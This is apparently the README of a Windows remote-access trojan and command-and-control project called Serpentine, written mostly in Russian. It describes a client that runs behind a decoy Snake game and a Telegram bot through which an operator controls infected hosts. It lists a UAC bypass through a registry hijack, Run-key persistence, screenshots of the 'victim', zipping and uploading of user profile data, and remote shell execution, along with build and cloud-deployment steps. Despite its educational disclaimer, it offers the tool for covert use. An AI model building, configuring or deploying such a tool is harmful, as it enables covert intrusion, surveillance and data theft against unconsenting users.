# 🐍 Serpentine

> **Advanced C2 Framework & Remote Administration PoC with Telegram Bot Interface and Stealth Decoy**

[![C++20](https://img.shields.io/badge/C%2B%2B-20-blue.svg?logo=c%2B%2B)](https://en.wikipedia.org/wiki/C%2B%2B20)
[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-3776AB.svg?logo=python&logoColor=white)](https://python.org)
[![aiogram 3.x](https://img.shields.io/badge/aiogram-3.x-2CA5E0.svg?logo=telegram&logoColor=white)](https://github.com/aiogram/aiogram)
[![Platform: Windows](https://img.shields.io/badge/Client-Windows_x64-0078D6.svg?logo=windows&logoColor=white)](https://microsoft.com/windows)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Purpose](https://img.shields.io/badge/Purpose-Educational%20%2F%20PoC-red.svg)](#-дисклеймер--disclaimer)

---

## 📌 О проекте / Overview

**Serpentine** — модульный исследовательский фреймворк для удалённого администрирования и тестирования на проникновение (C2 / RAT Proof-of-Concept). 

Архитектура проекта разделена на два независимых компонента:
1. **Client (C++20 / Windows)** — легковесный нативный клиент со встроенной игрой-приманкой («Змейка»), работающий в фоновом режиме через WinHTTP.
2. **C2 Server & Telegram Bot (Python / aiohttp / aiogram)** — бэкенд, совмещающий REST API для взаимодействия с клиентами и интерактивный Telegram-интерфейс для оператора с Inline-кнопками.

```
       [ Windows Target ]
      ┌──────────────────┐
      │   Console Snake  │  (Decoy UI)
      │  ┌────────────┐  │
      │  │ WinHTTP C2 │  │
      └──┴─────┬──────┴──┘
               │  POST /beacon, /result, /file
               ▼
      ┌──────────────────┐
      │   C2 Backend     │  (aiohttp REST API)
      │   (Python 3.11)  │
      └────────┬─────────┘
               │  aiogram 3.x Long-Polling
               ▼
      ┌──────────────────┐
      │   Telegram Bot   │  (Operator UI)
      │  ┌────────────┐  │
      │  │ Inline Kbd │  │
      └──┴────────────┴──┘
```

---

## ✨ Основные возможности

### 🖥 C++ Client
- **🎮 Консольная приманка (Decoy Snake Game)**: интерактивная консольная игра «Змейка», отвлекающая внимание пользователя, пока C2-поток работает асинхронно в фоне.
- **🛡 Определение прав и UAC Bypass**: проверка членства в группе администраторов (`CheckTokenMembership`) и PoC UAC Bypass через механизм реестра `ms-settings\Shell\Open\command` + `computerdefaults.exe`.
- **🔄 Механизм закрепления (Persistence)**: копирование исполняемого файла в `%APPDATA%\Microsoft\Windows` и добавление записи в ключ автозагрузки `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
- **📸 Снятие скриншотов**: захват экрана с помощью GDI+ и отправка PNG/BMP на C2 в бинарном виде.
- **📂 Сбор данных и архивация (miniz)**: сканирование профилей пользователей в `C:\Users` и упаковка целевых данных в ZIP-архив на лету без внешних библиотек.
- **⚡ Удалённый терминал**: выполнение команд `cmd.exe` и `powershell.exe` с перехватом STDOUT/STDERR и возвратом оператору.
- **🌐 Безопасный транспорт**: передача данных через WinHTTP API с поддержкой HTTPS.

### 🤖 Telegram C2 Server
- **📱 Удобное управление**: полноценный мобильный пульт управления целями прямо через Telegram.
- **📊 Список сессий**: отображение подключённых хостов с индикацией привилегий (`🛡 ADMIN` / `👤 USER`).
- **🎛 Интерактивные inline-кнопки**:
  - `CMD (admin)` / `PS (admin)` — запуск процессов с повышенными правами.
  - `CMD (user)` / `PS (user)` — выполнение команд в контексте пользователя.
  - `📸 Скриншот` — мгновенный снимок экрана жертвы прямо в чат.
  - `📂 Users.zip` — выгрузка архива данных профилей пользователей.
  - `🗂 Юзеры` — перечисление пользователей системы.
- **☁️ Готовность к облаку**: встроенная конфигурация для Amvera Cloud (`amvera.yml`), Docker или любого Linux VPS.

---

## 🚀 Быстрый старт

### 1. Настройка и запуск C2 Сервера

#### Переменные окружения:
| Переменная | Описание | Пример |
|---|---|---|
| `BOT_TOKEN` | Токен Telegram-бота от `@BotFather` | `123456789:ABCdefGHI...` |
| `ADMIN_ID` | Ваш Telegram User ID (число) | `987654321` |
| `PORT` | Порт для прослушивания C2 HTTP API (по умолчанию 8080) | `8080` |

#### Локальный запуск:
```bash
# Клонирование репозитория
git clone https://github.com/fonyaxd/serpentine.git
cd serpentine

# Установка зависимостей
pip install -r requirements.txt

# Экспорт переменных (Linux / macOS)
export BOT_TOKEN="ВАШ_ТОКЕН_БОТА"
export ADMIN_ID="ВАШ_TELEGRAM_ID"
export PORT="8080"

# Для Windows PowerShell:
# $env:BOT_TOKEN="ВАШ_ТОКЕН_БОТА"
# $env:ADMIN_ID="ВАШ_TELEGRAM_ID"
# $env:PORT="8080"

python bot/bot.py
```

#### Деплой в Amvera Cloud:
Репозиторий уже содержит готовый файл `amvera.yml`. Достаточно подключить репозиторий в панели Amvera и указать `BOT_TOKEN` и `ADMIN_ID` в переменных окружения сервиса.

---

### 2. Сборка C++ Клиента

#### Шаг 1: Настройка адреса C2
Перед сборкой укажите домен или IP вашего C2 сервера в файле `cpp/main.cpp`:
```cpp
// cpp/main.cpp
static const std::wstring C2_HOST_W = L"your-c2-domain.com";
static const std::string  C2_HOST_A = "your-c2-domain.com";
```

#### Шаг 2: Сборка через CMake (MSVC / Visual Studio)
```bash
cd cpp
mkdir build && cd build
cmake .. -A x64
cmake --build . --config Release
```

Готовый бинарный файл будет расположен в папке `build/Release/serpentine.exe`.

#### Требования к сборке:
- Компилятор с поддержкой **C++20** (MSVC v143+ / Visual Studio 2022 или LLVM-MinGW).
- CMake 3.20+.
- Windows SDK (WinHTTP, GDI+, Shell32).

---

## 📁 Структура репозитория

```
serpentine/
├── bot/
│   └── bot.py            # Сервер C2 на aiohttp и Telegram бот на aiogram 3
├── cpp/
│   ├── CMakeLists.txt    # Конфигурация сборки CMake
│   ├── main.cpp          # Точка входа, beacon-цикл, обработка задач
│   ├── snake_game.cpp    # Консольная игра-приманка (Змейка)
│   ├── http.h            # HTTP-клиент на WinHTTP API
│   ├── admin.h           # Проверка прав администратора
│   ├── uac.h             # PoC обхода UAC (ms-settings hijack)
│   ├── persist.h         # Модуль автозагрузки (HKCU Run key)
│   ├── screenshot.h      # Модуль захвата экрана (GDI+)
│   ├── shell.h           # Исполнение CMD / PowerShell команд
│   ├── users.h           # Перечисление пользователей
│   ├── zip.h             # Архивирование файлов
│   └── util.h            # Вспомогательные утилиты строк и путей
├── third_party/
│   ├── miniz.c / miniz.h # Легковесная библиотека компрессии Deflate/ZIP
│   └── nlohmann/json.hpp # JSON парсер для Modern C++
├── amvera.yml            # Конфигурация для Amvera Cloud
├── requirements.txt      # Python-зависимости (aiogram, aiohttp)
└── README.md             # Документация проекта
```

---

## 🔒 Безопасность и хранение секретов

Проект спроектирован с соблюдением практик безопасного хранения конфиденциальных данных:
- Токены бота (`BOT_TOKEN`) и идентификаторы оператора (`ADMIN_ID`) **никогда не хранятся в коде** и передаются исключительно через переменные окружения.
- Клиент использует конфигурируемый хост, задаваемый оператором при компиляции.

---

## ⚠️ Дисклеймер / Disclaimer

> Данный проект создан исключительно в **образовательных и исследовательских целях**, для демонстрации принципов работы сетевых протоколов C2, механизмов Win32 API и архитектуры клиент-серверных приложений. 
> 
> Автор не несёт ответственности за любое неправомерное использование исходного кода или скомпилированных бинарных файлов. Использование данного ПО против целей без предварительного письменного согласия владельца является незаконным.

---

## 📄 Лицензия

Распространяется под лицензией [MIT](LICENSE). Подробности в файле лицензии.
